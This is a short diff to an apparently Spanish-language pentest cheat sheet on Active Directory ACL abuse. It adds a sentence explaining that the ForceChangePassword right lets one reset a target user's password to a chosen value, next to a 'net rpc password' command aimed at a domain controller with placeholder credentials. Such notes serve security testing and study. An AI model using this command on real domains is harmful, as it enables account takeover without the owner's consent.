@@ -4,6 +4,8 @@ Tags: #Linux #ForceChangePassword #AD #ACL #Net
 
 ## ForceChangePassword sobre Usuario 
 
+Si tenemos esta ACL sobre un **User**, podemos **forzar el cambio de contraseña** del usuario objetivo y establecer una contraseña que controlemos.
+
 ```bash 
 Paso 1:
 ❯ net rpc password 'TargetUser' 'NewPass123!' -U domain.corp/user%'passwd' -S IP_DC
